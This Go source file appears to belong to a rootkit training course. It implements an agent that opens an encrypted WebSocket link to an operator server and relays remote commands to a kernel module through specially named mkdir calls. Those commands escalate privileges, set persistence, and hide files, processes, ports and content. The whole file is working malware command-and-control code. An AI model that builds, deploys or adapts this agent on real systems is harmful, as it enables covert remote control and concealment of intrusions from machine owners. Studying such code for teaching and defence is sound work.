// Agent mkdir bridge.
// Connect to the server over WebSocket, receive commands, translate each
// to a mkdir name, and issue os.Mkdir so the kernel module acts on it.
package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
	"unsafe"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
	"golang.org/x/sys/unix"
)

//go:embed keys/agent.key
var agentPrivKey []byte

//go:embed keys/operator.pub
var operatorPubKey []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "agent: %v\n", err)
		os.Exit(1)
	}
}

// --- Crypto + transport (provided, same as L15 but with WebSocket) ---

type command struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

var (
	sharedKey     [32]byte
	agentPubBytes []byte
	gcm           cipher.AEAD
	wsConn        *websocket.Conn
	writeMu       sync.Mutex
)

func initTransport() error {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(agentPrivKey)
	if err != nil {
		return err
	}
	agentPubBytes = priv.PublicKey().Bytes()
	pub, err := curve.NewPublicKey(operatorPubKey)
	if err != nil {
		return err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), sharedKey[:]); err != nil {
		return err
	}
	block, err := aes.NewCipher(sharedKey[:])
	if err != nil {
		return err
	}
	gcm, err = cipher.NewGCM(block)
	if err != nil {
		return err
	}
	return nil
}

func sealAEAD(plaintext []byte) ([]byte, error) {
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(ciphertext []byte) ([]byte, error) {
	if len(ciphertext) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

func wsSend(v any) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	ct, err := sealAEAD(plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsURL() string {
	scheme := "wss"
	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
		scheme = "ws"
	}
	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
}

func jitter() time.Duration {
	n, _ := rand.Int(rand.Reader, big.NewInt(7000))
	return time.Duration(3000+n.Int64()) * time.Millisecond
}

// --- Bridge logic ---

func run() error {
	if err := initTransport(); err != nil {
		return err
	}
	fmt.Println("transport ready, connecting to", serverAddr)

	for {
		if err := wsSession(); err != nil {
			fmt.Fprintf(os.Stderr, "session: %v\n", err)
			time.Sleep(jitter())
		}
	}
}

func wsSession() error {
	ctx := context.Background()
	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
	if err != nil {
		return err
	}
	defer conn.CloseNow()
	conn.SetReadLimit(4 << 20)

	writeMu.Lock()
	wsConn = conn
	writeMu.Unlock()

	hello, _ := json.Marshal(map[string]string{"t": "hello"})
	ct, err := sealAEAD(hello)
	if err != nil {
		return err
	}
	if err := conn.Write(ctx, websocket.MessageBinary, append(agentPubBytes, ct...)); err != nil {
		return err
	}

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		plain, err := openAEAD(msg)
		if err != nil {
			continue
		}
		var cmd command
		if json.Unmarshal(plain, &cmd) != nil {
			continue
		}

		var data any
		switch cmd.Op {
		case "INFO":
			state, err := queryKernelState()
			if err != nil {
				data = map[string]any{"error": err.Error()}
			} else {
				data = map[string]any{"state": state}
			}
		case "QUIT":
			os.Mkdir("rklings.quit", 0)
			wsSend(map[string]any{"data": "OK"})
			return nil
		default:
			line := cmd.Op
			if cmd.Arg != "" {
				line += " " + cmd.Arg
			}
			name := translate(line)
			if name == "" {
				data = map[string]any{"error": "unknown command: " + line}
			} else if err := os.Mkdir(name, 0); err != nil {
				data = map[string]any{"error": err.Error()}
			} else {
				data = "OK"
				fmt.Printf("exec: %s -> %s\n", line, name)
			}
		}

		if err := wsSend(map[string]any{"data": data}); err != nil {
			return err
		}
	}
}

func queryKernelState() (string, error) {
	buffer := make([]byte, 12288)
	copy(buffer, "rklings.info")
	length, _, errno := unix.Syscall(unix.SYS_MKDIR,
		uintptr(unsafe.Pointer(&buffer[0])), 0, 0)
	runtime.KeepAlive(buffer)
	if errno != 0 {
		return "", errno
	}
	if length == 0 || length >= uintptr(len(buffer)) {
		return "", fmt.Errorf("invalid response length %d", length)
	}
	return strings.TrimSpace(string(buffer[:length])), nil
}

func translate(line string) string {
	parts := strings.SplitN(line, " ", 3)
	switch parts[0] {
	case "PING":
		return "rklings.ping"
	case "STATUS":
		return "rklings.status"
	case "QUIT":
		return "rklings.quit"
	case "PERSIST":
		return "rklings.persist"
	case "UNPERSIST":
		return "rklings.unpersist"
	case "ESCALATE":
		if len(parts) >= 2 {
			return "rklings.e." + parts[1]
		}
		return "rklings.e"
	case "HIDE":
		if len(parts) < 3 {
			return ""
		}
		switch parts[1] {
		case "FILE":
			return "rklings.h.f." + parts[2]
		case "PID":
			return "rklings.h.i." + parts[2]
		case "PORT":
			return "rklings.h.p." + parts[2]
		case "CONTENT":
			return "rklings.h.c." + parts[2]
		}
	case "UNHIDE":
		if len(parts) < 3 {
			return ""
		}
		switch parts[1] {
		case "FILE":
			return "rklings.u.f." + parts[2]
		case "PID":
			return "rklings.u.i." + parts[2]
		case "PORT":
			return "rklings.u.p." + parts[2]
		case "CONTENT":
			return "rklings.u.c." + parts[2]
		}
	}
	return ""
}
